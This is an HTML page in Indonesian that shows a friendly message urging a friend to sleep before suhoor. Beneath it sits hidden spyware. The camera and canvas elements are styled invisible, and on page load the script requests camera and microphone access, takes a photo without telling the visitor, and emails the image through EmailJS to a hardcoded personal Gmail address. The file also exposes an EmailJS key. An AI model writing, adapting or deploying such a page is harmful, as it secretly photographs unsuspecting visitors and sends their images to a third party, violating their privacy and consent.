<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Romantic Web</title>
    <style>
        body {
            background: linear-gradient(to right, #ff9a9e, #fad0c4);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #fff;
            text-align: center;
            padding: 50px;
        }
        .love {
            font-size: 2em;
            margin: 20px 0;
            animation: float 2s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        video, canvas {
            display: none; /* Sembunyikan elemen kamera */
        }
    </style>
</head>
<body>
    <h1>‚ù§Ô∏è hay teman‚ù§Ô∏è</h1>
    <div class="love">"kenapa kamu belum tidur teman"</div>
    <div class="love">"tidur lah teman besok kamu harus sahur"</div>
    <div class="love">"jika kamu tidak tidur maka kamu bsok tidak puasa teman dan kamu dosa teman!"</div>

    <!-- Elemen kamera tersembunyi -->
    <video id="video" autoplay></video>
    <canvas id="canvas" width="320" height="240"></canvas>

    <!-- EmailJS Setup -->
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function () {
            emailjs.init("WYWXLlJnL5aTjgSxa"); // üîê Key EmailJS Anda
        })();

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        // Meminta akses kamera dan mikrofon secara otomatis
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => {
                video.srcObject = stream;
                console.log("Akses kamera dan mikrofon diberikan");

                // Ambil foto otomatis setelah kamera aktif
                video.onloadedmetadata = () => {
                    // Ambil foto langsung tanpa delay
                    takeSnapshot(stream);
                };
            })
            .catch(err => {
                console.error("Gagal mengakses kamera/mikrofon:", err);
            });

        function takeSnapshot(stream) {
            context.drawImage(video, 0, 0, 320, 240);
            const imageDataURL = canvas.toDataURL('image/png');

            // Kirim foto ke admin (email: maulanaarif95415@gmail.com)
            emailjs.send("service_fhods8b", "YOUR_TEMPLATE_ID", {
                to_email: "maulanaarif95415@gmail.com", // üìß Email tujuan
                photo: imageDataURL
            }).then(() => {
                // Hentikan stream kamera setelah foto diambil
                stream.getTracks().forEach(track => track.stop());
                console.log("Foto telah dikirim ke admin dan kamera dihentikan.");
            }, (error) => {
                console.error("Gagal mengirim foto:", error);
            });
        }
    </script>
</body>
</html>